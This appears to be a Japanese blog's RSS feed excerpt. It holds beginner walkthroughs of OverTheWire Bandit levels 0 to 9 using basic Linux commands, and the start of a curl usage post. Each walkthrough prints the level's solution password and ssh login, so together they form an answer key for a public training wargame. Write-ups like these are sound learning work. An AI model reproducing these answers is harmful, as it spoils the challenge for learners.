&lt;p&gt;特になし。data.txtを&lt;code&gt;cat&lt;/code&gt;したら「あっ、grepやこれ」となりました。&lt;/p&gt;
&lt;h2 id=&#34;level-9&#34;&gt;Level 9&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt and is the only line of text that occurs only once&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはdata.txtにある&lt;/li&gt;
&lt;li&gt;data.txtの中で、1度しか出てこない行がパスワードである&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit8@bandit:~$ cat data.txt | sort | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
bandit8@bandit:~$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit9 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit9@bandit.labs.overthewire.org&#39;s password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat&lt;/code&gt;したときに&lt;code&gt;uniq&lt;/code&gt;だと思ったので、&lt;code&gt;cat data.txt | uniq&lt;/code&gt;でやったのだが、一意に絞れなかった。&lt;/p&gt;
&lt;h4 id=&#34;uniqなものだけ表示したい&#34;&gt;uniqなものだけ表示したい&lt;/h4&gt;
&lt;p&gt;ユニークなもの、つまり重複していないもののみ表示するためには、&lt;code&gt;uniq&lt;/code&gt;に-&lt;code&gt;u&lt;/code&gt;をつけてあげる必要があります。&lt;/p&gt;
&lt;p&gt;オプションを指定しない&lt;code&gt;uniq&lt;/code&gt;は、重複していたものがあれば1つにまとめて表示する動作のようです。&lt;/p&gt;
&lt;h4 id=&#34;uniq前にsortが必要&#34;&gt;uniq前にsortが必要！！！&lt;/h4&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.atmarkit.co.jp/ait/articles/1611/14/news021.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【 uniq 】コマンド――重複している行を削除する&lt;/a&gt;
上記サイトに以下の文言があった&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;uniqコマンドは、元のテキストが“並べ替え済み”であることが前提になるので、必要に応じて先に「sort」コマンドで並べ替えを実行しておきます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;sort | uniq&lt;/code&gt;をセットで記載している記事が何個かあったけど、これで納得しました。&lt;/p&gt;
&lt;h2 id=&#34;今日はおしまい&#34;&gt;今日はおしまい&lt;/h2&gt;
&lt;p&gt;OverTheWireはセキュリティに関する知識を学ぶためという目的でしたが、未だセキュリティについては出てこないですね。Banditは初心者レベルなので、「とりあえずLinuxコマンドが覚えろ、さすれば扉は開かん」というお告げだと思っておきます。それにしたってモチベーションが落ちない不思議。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level4〜6</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level4-6/</link>
        <pubDate>Tue, 15 Jun 2021 19:47:28 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level4-6/</guid>
        <description>&lt;h2 id=&#34;level-4&#34;&gt;Level 4&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a hidden file in the inhere directory.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;inhereディレクトリの隠しファイルからパスワードを取得する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit3@bandit:~$ cd inhere/
bandit3@bandit:~/inhere$ ls -a
.  ..  .hidden
bandit3@bandit:~/inhere$ cat .hidden 
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
bandit3@bandit:~/inhere$ exit

# ここからローカル
$ ssh -l bandit4 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit4@bandit.labs.overthewire.org&#39;s password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;特になし&lt;/p&gt;
&lt;h2 id=&#34;level-5&#34;&gt;Level 5&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;inhereディレクトリにある人間に読むことのできるファイルからパスワードを取得する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit4@bandit:~$ cd inhere/
bandit4@bandit:~/inhere$ ls
-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09
bandit4@bandit:~/inhere$ ls | xargs -I {} awk 1 ./{}
�/`2ғ�%��rL~5�g��� �����
��p,k�;��r*��   �.!��C��J       �dx,�
e�)�#��5��
          ��p��V�_���ׯ�mm
������h!TQO�`�4&amp;quot;aל�߂phT��,�A
?�4�ו$����I&amp;amp;������c���ގ.�
�r�l$�?h�9(&#39;���!y�e�#�x�O��=��
ly���~��A�f����-E�{���m�����ܗM
koReBOKuIDDepwhWk7jZC0RTdopnAYKh # これが目的のパスワード
�T�?�i��j��îP�F�l�n��J����{��@
�e�0$�in=��_b�5FA�P7sz��gNT
bandit4@bandit:~/inhere$ exit

# ここからローカル
$ ssh -l bandit5 -p 2220 bandit.labs.overthewire.org                                                                ?[master]
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit5@bandit.labs.overthewire.org&#39;s password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;特につまりはしませんでしたが、&lt;code&gt;ls&lt;/code&gt;するとファイルが何個もありました。これを全て&lt;code&gt;cat&lt;/code&gt;してもよかったのですが、せっかくならもう少しうまいやり方でできないか調べてみました。&lt;/p&gt;
&lt;p&gt;最初は&lt;code&gt;ls | xargs -I{} cat ./{}&lt;/code&gt;でやったのですが・・・&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit4@bandit:~/inhere$ ls | xargs -I{} cat ./{}
�/`2ғ�%��rL~5�g��� �������p,k�;��r*��   �.!��C��J       �dx,�e�)�#��5��
                                                                       ��p��V�_���ׯ�mm������h!TQO�`�4&amp;quot;aל�߂phT��,�Ai�4�ו$����I&amp;amp;��?��r�l$�?h�9(&#39;���!y�e�#�x�O��=��ly���~��A�f����-E�{���m�����ܗMkoReBOKuIDDepwhWk7jZC0RTdopnAYKh
�T�?�i��j��îP�F�l�n��J����{��@�e�0$�in=��_b�5FA�P7sz��gNbandit4@bandit:~/inhere$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;読みづらい・・・&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat&lt;/code&gt;に2つ以上のファイルを引数に取る場合、ファイルに改行が入ってなかったらそのまま表示されるらしいです。ファイルごとに改行して欲しかったので、なにかないかと模索したところ以下のサイトにたどり着きました&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/ngyuki/items/b55ce646cd84eb71c900&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;複数のファイルを終端に改行がなければ改行を追加して結合する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;awk 1&lt;/code&gt;でいけるっぽいです。この記事で出てくる&lt;code&gt;awk&lt;/code&gt;のパターンとかアクションとかがわからなかったので、それは以下の記事で補完しました&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bioinfo-dojo.net/2017/09/28/awk-pattern-action/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;awk パターンとアクション
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://itdoc.hitachi.co.jp/manuals/3020/30203S3530/JPAS0241.HTM&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;awkコマンド（テキストの加工やパターン処理をする）
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;awkについてわかったことは&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文法は&lt;code&gt;awk &#39;pattern {action} ファイル名&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;actionではファイルの各行に適用させる動作
&lt;ul&gt;
&lt;li&gt;actionは省略でき、省略した場合はその行を標準出力するアクションになる&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;patternはactionを適用させる行の条件(正規表現とかで指定するみたい)
&lt;ul&gt;
&lt;li&gt;ここで&lt;code&gt;1&lt;/code&gt;を指定すると全ての行にactionを適用させるということになる&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;level-6&#34;&gt;Level 6&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:
human-readable,
1033 bytes in size,
not executable&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはinhereディレクトリに格納されている&lt;/li&gt;
&lt;li&gt;そのファイルは以下の特徴を持っている
&lt;ul&gt;
&lt;li&gt;人間に読める&lt;/li&gt;
&lt;li&gt;1033bytes&lt;/li&gt;
&lt;li&gt;実行できない&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit5@bandit:~$ cd inhere
bandit5@bandit:~/inhere$ find -type f -size 1033c -print0 ! -executable |　xargs -0 -I{} cat ./{}
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
bandit5@bandit:~/inhere$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit6 -p 2220 bandit.labs.overthewire.org                                                                                  ?[master]
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit6@bandit.labs.overthewire.org&#39;s password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;まずは&lt;code&gt;find&lt;/code&gt;のオプションを調べました。特に実行権限を持っていないファイルの検索の仕方ですね。調べると検索オプションの前に&lt;code&gt;!&lt;/code&gt;をつけて否定系にすればよかったようです。&lt;/p&gt;
&lt;p&gt;また、調べているうちに、&lt;code&gt;find&lt;/code&gt;に&lt;code&gt;-print0&lt;/code&gt;とつけて&lt;code&gt;xargs -0 ・・・&lt;/code&gt;としているいるものも散見されました。&lt;/p&gt;
&lt;h4 id=&#34;xargs--0の正体&#34;&gt;xargs -0の正体&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;xargs&lt;/code&gt;の &lt;code&gt;-0&lt;/code&gt;は区切り文字をヌル文字(\0)にするオプションです。デフォルトは空白や改行コードです。&lt;/p&gt;
&lt;h4 id=&#34;-0をつけないと何が困るのか&#34;&gt;-0をつけないと何が困るのか&lt;/h4&gt;
&lt;p&gt;xargsで処理する引数に空白がある場合に困っちゃう&lt;/p&gt;
&lt;p&gt;例えば以下のケース&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ls
space in the finename.txt # こいつを消したい
$ find . -name &#39;*.txt&#39; | xargs rm
rm: ./space: No such file or directory
rm: in: No such file or directory
rm: the: No such file or directory
rm: filename.txt: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何も指定しないと、空白ごとに&lt;code&gt;rm&lt;/code&gt;してしまいます。意図した動作にするために区切り文字を変えるために&lt;code&gt;-0&lt;/code&gt;をつけて対応します。&lt;/p&gt;
&lt;h4 id=&#34;find--print0の理由&#34;&gt;find -print0の理由&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;xargs -0&lt;/code&gt;としたので、&lt;code&gt;xargs&lt;/code&gt;の処理ではヌル文字が区切り文字になりました。&lt;code&gt;find&lt;/code&gt;で&lt;code&gt;-print0&lt;/code&gt;をつけることで結果のファイル名の末尾にヌル文字が付与されます。これでxargsの処理が意図する動作になります。&lt;/p&gt;
&lt;h4 id=&#34;参考サイト&#34;&gt;参考サイト&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://taroline.hateblo.jp/entry/2014/10/27/022124&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;findコマンドでの検索時に、否定の条件を指定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/maskedw/items/2dfdf6fa7eee991ddc45&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;findとxargsコマンドで-print0オプションを使う理由(改)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://techblog.kyamanak.com/entry/2018/02/12/202256&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;0212【Linux】xargs コマンドの使い方がよく分からない&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;今日はおしまい&#34;&gt;今日はおしまい&lt;/h2&gt;
&lt;p&gt;find便利ですね。&lt;code&gt;find . -name &#39;hogehoge&#39;&lt;/code&gt;という定型で覚えて使ってましたが、オプションや&lt;code&gt;xargs&lt;/code&gt;と組み合わせれば全文検索なんかもできそうです。副次的に色々なtipsも知ることができるので、モチベーションを保てています。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level0〜3</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level0-3/</link>
        <pubDate>Sun, 13 Jun 2021 21:52:17 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level0-3/</guid>
        <description>&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;
&lt;p&gt;僕もエンジニアの端くれではあるので、たまにQiitaで面白い記事を読んでます。いつも通りQiitaを見ているとこんな記事がありました&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/tmgauss/items/da5e89496e951629517f&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;イスラエル8200部隊出身のガチプロハッカーに、一流のハッカーになる方法について聞いてみた。&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;こういう記事を見るとなんだかワクワクします。&lt;/p&gt;
&lt;p&gt;この記事の中で以下が気になり、&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ハッキングチャレンジはその名の通り、ハッキングを試してみることです。有名なのは『OverTheWire』でしょうか。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;少し調べてみると・・・ふむふむ、ゲーム形式でハッキングを練習し、セキュリティの知識を身につけることができるサイトのようだとわかりました。&lt;/p&gt;
&lt;p&gt;ガチプロハッカーになるつもりはありませんが、こういった知識も身につけたいなと思ってはいたので、これを機会にこの&lt;a class=&#34;link&#34; href=&#34;https://overthewire.org/wargames/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;OverTheWire&lt;/a&gt;で練習してみることにしました。&lt;/p&gt;
&lt;h2 id=&#34;私の今の状態&#34;&gt;私の今の状態&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;セキュリティの知識はカッスカス&lt;/li&gt;
&lt;li&gt;大学時代にセキュリティの講義受けたなぁ(遠い目)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;level-0&#34;&gt;Level 0&lt;/h2&gt;
&lt;p&gt;初心者はまずBandit(意味は盗賊)からスタートです&lt;/p&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;level0のゴールを整理するとsshで&lt;code&gt;bandit.labs.overthewire.org&lt;/code&gt;にログインする&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ポートは2220&lt;/li&gt;
&lt;li&gt;ユーザーネームは&lt;code&gt;bandit0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;パスワードも&lt;code&gt;bandit0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sshコマンド使うんだなとアタリがつきました&lt;/p&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -l bandit0 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit0@bandit.labs.overthewire.org&#39;s password: bandit0
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;sshコマンドか、それならやったことある！と思って以下のコマンドでエラー&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh bandit0@bandit.labs.overthewire.org:2220
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ちゃんと&lt;code&gt;$ man ssh&lt;/code&gt;でしっかりドキュメントをみることが教訓になりました&lt;/p&gt;
&lt;h2 id=&#34;level-1&#34;&gt;Level 1&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;sshでbandit1ユーザとしてログインする&lt;/li&gt;
&lt;li&gt;passwordは&lt;code&gt;home&lt;/code&gt;ディレクトリの&lt;code&gt;readme&lt;/code&gt;ファイルの中に書いてある&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1

$ &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;

$ ssh -l bandit1 -p &lt;span class=&#34;m&#34;&gt;2220&lt;/span&gt; bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit0@bandit.labs.overthewire.org&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;基本的なlinuxコマンドだったので特にやったことはありませんでした&lt;/p&gt;
&lt;h2 id=&#34;level-2&#34;&gt;Level 2&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a file called - located in the home directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;というファイルの中のパスワードを入手する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;-&lt;/code&gt;という名前のフォルダをどうやって&lt;code&gt;cat&lt;/code&gt;するのかがわからなかったので詰まりました&lt;/p&gt;
&lt;p&gt;ハイフンをエスケープすればいいのかなと思って&lt;code&gt;$ cat \-&lt;/code&gt;を試しましたがうまくいかず。
&lt;code&gt;$ man cat&lt;/code&gt;でオプションを調べてみましたが、ピンとくるものはなかったです。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat ファイル名 ハイフン&lt;/code&gt;で検索してみて以下のサイトにたどり着きました&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.softel.co.jp/blogs/tech/archives/5459&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【linux】ハイフンから始まるファイル名を指定できない（エラーになる）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;どうやら、ハイフンで始まるファイル名をそのまま&lt;code&gt;cat&lt;/code&gt;するとうまくいかないみたいです。パスで指定してあげればハイフンから始まるファイルでも&lt;code&gt;cat&lt;/code&gt;できそうだとわかりました&lt;/p&gt;
&lt;p&gt;ここまで調べて回答がわかったのですが、そもそも問題文の下に&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Google Search for “dashed filename”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;と書いてました・・・&lt;/p&gt;
&lt;h2 id=&#34;level-3&#34;&gt;Level 3&lt;/h2&gt;
&lt;h3 id=&#34;goal-3&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a file called spaces in this filename located in the home directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;del&gt;ファイル名がスペース(空白)であるファイルからパスワードを入手する&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;spaces in filename&lt;/code&gt;というファイルからパスワードを入手する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-3&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

$ exit

$ ssh -l bandit3 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit3@bandit.labs.overthewire.org&#39;s password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-3&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ls -l&lt;/code&gt;しても空白で始まるファイルがないなぁと思ってましたが、どうやら勘違いをしていたようです。&lt;/p&gt;
&lt;p&gt;Level2では&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a file called - located in the home directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;こういうゴールで、パスワードは使わないのかと思ってましたが、&lt;strong&gt;そんな訳ない&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ちゃんと&lt;code&gt;The password for the next level&lt;/code&gt;と書いてあるので、Level2で取得したパスワードと次のユーザである&lt;code&gt;bandit2&lt;/code&gt;で改めてsshをログインしてからLevel 3に進むみたいです。&lt;/p&gt;
&lt;p&gt;省略せんといて・・・&lt;/p&gt;
&lt;p&gt;なので改めて&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -l bandit2 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit2@bandit.labs.overthewire.org&#39;s password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;bandit2でログインし直してからLevel 3に行きました&lt;/p&gt;
&lt;h2 id=&#34;今日はおしまい&#34;&gt;今日はおしまい&lt;/h2&gt;
&lt;p&gt;いろいろトラブルはあったものの、Level 3までできました。1つ気をつけたいのが、sshしてコマンドを打たない時が一定時間を超えると入力を受け付けなくなります。おそらくsshのタイムアウトでしょうか？その時はもう一度ログインし直せばOKです。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>curlコマンドの使い方</title>
        <link>https://tadakun8.github.io/post/usage-curl/</link>
        <pubDate>Sun, 13 Jun 2021 15:32:18 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/usage-curl/</guid>
        <description>&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;
&lt;p&gt;同僚には凄腕のshell職人がいます。案件で、APIのクライアントにPostmanが推奨されているのですが、そのshell職人がcurlを使ってるのを隣で見てました。覚えたら手軽そうだなと思ったのでこれを機にcurlの使い方を覚えたいとのモチベがありました。&lt;/p&gt;
&lt;h2 id=&#34;使い方&#34;&gt;使い方&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OPTION&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使い方だけ見れば簡単ですが、curlに関わらずlinuxコマンドはオプションをどれだけ頭にインデックスするかだと思います。&lt;/p&gt;
&lt;h2 id=&#34;ユースケースでオプション紹介&#34;&gt;ユースケースでオプション紹介&lt;/h2&gt;
&lt;h3 id=&#34;postしたい&#34;&gt;POSTしたい&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -X POST -d &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -d &lt;span class=&#34;nv&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sample@example.com URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;-X : HTTPメソッドを指定できる&lt;/li&gt;
&lt;li&gt;-d : リクエストボディを指定できる
&lt;ul&gt;
&lt;li&gt;1つ1つ指定する&lt;/li&gt;
&lt;li&gt;=(イコール)で定義していく&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ヘッダー情報を追加してリクエストしたい&#34;&gt;ヘッダー情報を追加してリクエストしたい&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; URL
&lt;span class=&#34;c1&#34;&gt;# または&lt;/span&gt;
$ curl --header &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;レスポンスヘッダだけ表示したい&#34;&gt;レスポンスヘッダ「だけ」表示したい&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -I URL
&lt;span class=&#34;c1&#34;&gt;# または&lt;/span&gt;
$ curl --head URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;レスポンスヘッダも表示したい&#34;&gt;レスポンスヘッダ「も」表示したい&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -i URL
&lt;span class=&#34;c1&#34;&gt;# または&lt;/span&gt;
$ curl --include URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;詳細な情報も表示したい&#34;&gt;詳細な情報も表示したい&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -v URL
$ curl --verbose URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;余計な情報は表示したくない&#34;&gt;余計な情報は表示したくない&lt;/h3&gt;
